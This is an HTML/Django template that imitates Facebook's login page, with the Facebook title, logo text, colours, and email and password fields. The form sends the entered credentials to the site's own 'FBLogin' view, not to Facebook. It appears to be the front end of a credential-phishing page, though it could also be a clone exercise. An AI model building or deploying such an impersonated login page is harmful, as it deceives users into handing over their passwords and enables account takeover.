<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook â€“ log in or sign up</title>
  <style>
    body {
      margin: 0;
      font-family: Helvetica, Arial, sans-serif;
      background-color: #f0f2f5;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    .facebook-logo {
      font-size: 48px;
      color: #1877f2;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .login-box {
      background: #fff;
      padding: 20px 16px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      width: 360px;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .login-box input {
      padding: 14px;
      font-size: 16px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
    }

    .login-box button {
      padding: 14px;
      font-size: 16px;
      background-color: #1877f2;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .login-box button:hover {
      background-color: #165ecc;
    }

    .forgot {
      text-align: center;
      margin-top: 10px;
    }

    .forgot a {
      text-decoration: none;
      color: #1877f2;
      font-size: 14px;
    }

    .separator {
      border-bottom: 1px solid #dddfe2;
      margin: 16px 0;
    }

    .create-btn {
      background-color: #42b72a;
      margin: 0 auto;
      width: fit-content;
      padding: 12px 20px;
      border-radius: 6px;
      font-size: 16px;
    }

    .create-btn:hover {
      background-color: #36a420;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="facebook-logo">facebook</div>
    <form action="{% url 'Facebook:FBLogin' %}" method="post">
      {% csrf_token %}
      <div class="login-box">
      <input type="text" name="email" placeholder="Email or phone number">
      <input type="password" name="password" placeholder="Password">
      <button>Log In</button>
      <div class="forgot">
        <a href="#">Forgotten password?</a>
      </div>
      <div class="separator"></div>
      <button class="create-btn">Create new account</button>
    </div>
    </form>
  </div>
</body>
</html>
